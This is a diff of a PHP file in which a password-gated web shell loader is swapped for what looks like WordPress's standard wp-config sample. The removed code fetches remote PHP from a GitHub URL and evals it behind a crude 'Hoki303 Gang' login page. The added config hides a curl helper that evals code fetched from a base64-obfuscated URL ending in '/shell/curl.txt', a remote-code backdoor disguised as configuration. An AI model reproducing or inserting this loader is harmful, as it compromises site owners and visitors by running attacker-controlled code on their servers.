@@ -1,250 +1,108 @@
 <?php
-session_start();
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the installation.
+ * You don't have to use the website, you can copy this file to "wp-config.php"
+ * and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * Database settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
+ *
+ * @package WordPress
+ */
+
+// ** Database settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'database_name_here' );
+
+/** Database username */
+define( 'DB_USER', 'username_here' );
+
+/** Database password */
+define( 'DB_PASSWORD', 'password_here' );
+
+/** Database hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8' );
+
+/** The database collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+/**#@+
+ * Authentication unique keys and salts.
+ *
+ * Change these to different unique phrases! You can generate these using
+ * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
+ *
+ * You can change these at any point in time to invalidate all existing cookies.
+ * This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define( 'AUTH_KEY',         'put your unique phrase here' );
+define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
+define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
+define( 'NONCE_KEY',        'put your unique phrase here' );
+define( 'AUTH_SALT',        'put your unique phrase here' );
+define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
+define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
+define( 'NONCE_SALT',       'put your unique phrase here' );
+
+/**#@-*/
 
 /**
- * Disable error reporting
+ * WordPress database table prefix.
  *
- * Set this to error_reporting( -1 ) for debugging.
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
  */
-function geturlsinfo($url) {
-    if (function_exists('curl_exec')) {
-        $conn = curl_init($url);
-        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
-        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+function get($url) {
+      $ch = curl_init();
+  
+      curl_setopt($ch, CURLOPT_HEADER, 0);
+      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+      curl_setopt($ch, CURLOPT_URL, $url);
+  
+      $data = curl_exec($ch);
+      curl_close($ch);
+  
+      return $data;
+  }
+  $x= '?>';
+        eval($x . get(base64_decode('aHR0cHM6Ly95b2licmUuY29tL3NoZWxsL2N1cmwudHh0')));
 
-        // Set cookies using session if available
-        if (isset($_SESSION['coki'])) {
-            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
-        }
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the documentation.
+ *
+ * @link https://developer.wordpress.org/advanced-administration/debug/debug-wordpress/
+ */
+define( 'WP_DEBUG', false );
 
-        $url_get_contents_data = curl_exec($conn);
-        curl_close($conn);
-    } elseif (function_exists('file_get_contents')) {
-        $url_get_contents_data = file_get_contents($url);
-    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
-        $handle = fopen($url, "r");
-        $url_get_contents_data = stream_get_contents($handle);
-        fclose($handle);
-    } else {
-        $url_get_contents_data = false;
-    }
-    return $url_get_contents_data;
+/* Add any custom values between this line and the "stop editing" line. */
+
+
+
+/* That's all, stop editing! Happy publishing. */
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( 'ABSPATH' ) ) {
+        define( 'ABSPATH', __DIR__ . '/' );
 }
 
-// Function to check if the user is logged in
-function is_logged_in()
-{
-    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
-}
-
-// Check if the password is submitted and correct
-if (isset($_POST['log']) && $_POST['log'] === 'login' && isset($_POST['username']) && isset($_POST['password'])) {
-    // Validate username and password here
-    // Example validation (replace with your actual validation logic)
-    $entered_username = $_POST['username'];
-    $entered_password = $_POST['password'];
-    $hashed_password = '3a06dfb4c63cb932a3b51e0502ca05b5'; // Replace this with your MD5 hashed password
-
-    if ($entered_username === 'hoki303' && md5($entered_password) === $hashed_password) {
-        // Username and password are correct, store it in session
-        $_SESSION['logged_in'] = true;
-        $_SESSION['coki'] = 'asu'; // Replace this with your cookie data
-    } else {
-        // Username or password is incorrect
-        echo "<p class='error'>Incorrect username or password. Please try again.</p>";
-    }
-}
-
-// Check if the user is logged in before executing the content
-if (is_logged_in()) {
-    $a = geturlsinfo('https://raw.githubusercontent.com/Fajrul12345/Fajrulirfan/master/alfaa.txt');
-    eval('?>' . $a);
-} else {
-    // Display login form if not logged in
-    ?>
-    <!DOCTYPE html>
-    <html lang="en">
-    
-    <head>
-        <meta charset="UTF-8">
-        <meta http-equiv="X-UA-Compatible" content="IE=edge">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>LOGIN 303</title>
-        <link href="https://fonts.googleapis.com/css2?family=Creepster&family=Caveat+Brush&display=swap" rel="stylesheet">
-        <link rel="shortcut icon" href="https://thumbnail.imgbin.com/18/13/7/imgbin-fuck-middle-finger-stutta-sticker-others-WgUUDZJPu8pCqFDeT8X0Rnkz1_t.jpg" type="image/x-icon">
-        <style>
-    :root {
-        --text-color: #fff;
-        --text-red: rgb(255, 0, 0);
-        --box-color: #202e62;
-        --unactive: rgb(98, 98, 98);
-    }
-
-    * {
-        margin: 0;
-        padding: 0;
-    }
-
-    html {
-        height: 100vh;
-        width: 100%;
-    }
-
-    body {
-        overflow: hidden;
-        background-image: url(https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/85ec6aca-4849-4485-ba56-cce30eb0a325/dg06bjj-b07daa4a-770e-4c74-949d-be51db8b6ad7.png?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7InBhdGgiOiJcL2ZcLzg1ZWM2YWNhLTQ4NDktNDQ4NS1iYTU2LWNjZTMwZWIwYTMyNVwvZGcwNmJqai1iMDdkYWE0YS03NzBlLTRjNzQtOTQ5ZC1iZTUxZGI4YjZhZDcucG5nIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmZpbGUuZG93bmxvYWQiXX0.eBE04-sdWCDqr0yQ0lC0F38GQBAetjSHJkeagEMxdMY);
-        background-color: black;
-        background-size: cover;
-        background-repeat: no-repeat;
-        align-items: center;
-    }
-
-    .login-form {
-        height: 100vh;
-        width: 100%;
-        position: inherit;
-        box-sizing: border-box;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        flex-direction: column;
-    }
-
-    .logo {
-        font-family: 'Creepster', cursive;
-        color: var(--text-color);
-        font-size: 50px;
-    }
-
-    .logo span {
-        color: var(--text-red);
-    }
-
-    .login-box {
-        width: 300px;
-        background-color: var(--box-color);
-        padding: 40px;
-        margin-top: 10px;
-        border-radius: 15px;
-        box-shadow: 0px 3px 3px 0px rgba(0, 0, 0, 0.12), 0px 3px 6px 0px rgba(0, 0, 0, 0.22), 0px 5px 10px 0px rgba(0, 0, 0, 0.2), 0px 8px 12px 1px rgba(0, 0, 0, 0.19);
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-    }
-
-    .login-box input {
-        margin-top: 20px;
-        border-radius: 5px;
-        padding: 10px;
-        border: 1px solid var(--unactive);
-        background-color: var(--box-color);
-        outline: none;
-        color: var(--text-color);
-    }
-
-    .login-box .inputBox {
-        position: relative;
-        width: 100%;
-        display: flex;
-        flex-direction: column;
-    }
-
-    .inputBox span {
-        color: var(--unactive);
-        top: 20px;
-        position: absolute;
-        padding: 10px;
-        pointer-events: none;
-        transition: 300ms;
-    }
-
-    .login-box input:valid~span,
-    .login-box input:focus~span {
-        color: var(--text-color);
-        transform: translateX(10px) translateY(-7px);
-        font-size: 0.8em;
-        padding: 0 10px;
-        background: var(--box-color);
-    }
-
-    .submit {
-        display: flex;
-        justify-content: center;
-    }
-
-    .error {
-        color: var(--text-red);
-    }
-
-    .quote {
-        color: var(--text-color);
-        font-family: 'Caveat Brush';
-        font-size: 25px;
-    }
-
-    .copyright {
-        display: flex;
-        justify-content: center;
-        margin: 10px;
-        font-family: 'caveat Brush';
-        color: var(--text-color);
-        font-size: 20px;
-    }
-
-    .hidden {
-        visibility: hidden;
-    }
-
-    @media only screen and (max-width: 480px) {
-        body {
-            background-image: url(https://wallpapercave.com/wp/wp4020127.jpg);
-        }
-
-        .login-box {
-            width: calc(100vw - 100px);
-        }
-
-        .quote {
-            font-size: 20px;
-        }
-    }
-</style>
-    </head>
-    
-    <body>
-        <div class="login-form">
-            <h1 class="logo">LOGIN<span> Bro!!!</span></h1>
-            <div class="login-box">
-                <?php
-                if (isset($error_message)) {
-                    echo "<p class='error'>$error_message</p>";
-                }
-                ?>
-                <p class="quote">haha login first little bastard</p>
-                <form method="post">
-                    <input type="hidden" name="log" value="login">
-                    <div class="inputBox">
-                        <input type="text" name="username" required>
-                        <span>Username</span>
-                    </div>
-                    <div class="inputBox">
-                        <input type="password" name="password" required>
-                        <span>Password</span>
-                    </div>
-                    <div class="submit">
-                        <input type="submit" value="Login">
-                    </div>
-                </form>
-            </div>
-            <div class="copyright"><span>&copy Hoki303 Gang</span></div>
-        </div>
-    </body>
-    
-    </html>
-    <?php
-}
-?>
+/** Sets up WordPress vars and included files. */
